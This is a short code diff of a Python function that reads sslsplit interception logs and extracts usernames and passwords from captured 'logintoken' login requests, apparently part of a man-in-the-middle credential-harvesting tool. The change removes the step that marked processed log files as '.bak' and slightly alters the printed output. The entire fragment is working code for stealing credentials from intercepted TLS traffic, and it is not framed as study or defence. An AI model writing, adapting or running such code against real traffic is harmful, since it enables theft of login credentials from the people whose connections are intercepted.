@@ -55,19 +55,13 @@ def get_username_and_password():
         while True:
             directory = 'sslsplit-log'
             for filename in os.listdir(os.path.join('.', directory)):
-                if '.bak' in filename: continue
-                found = False
                 with open(os.path.join('.', directory, filename), 'r', errors='replace') as f:
                     lines = f.readlines()
                     for line in lines:
                         if 'logintoken' in line:
-                            found = True
                             username = line.split('&')[1].split('=')[1]
                             password = line.split('&')[2].split('=')[1]
-                            print(f'Username: {username}\nPassword: {password}')
-                if found:
-                    pathname = os.path.join('.', directory, filename)
-                    os.rename(pathname, pathname + '.bak')
+                            print(f'Username: {username}\nPassword: {password}\n')
             time.sleep(1)
             if not os.path.exists('sslsplit.pid'): return
     except KeyboardInterrupt:
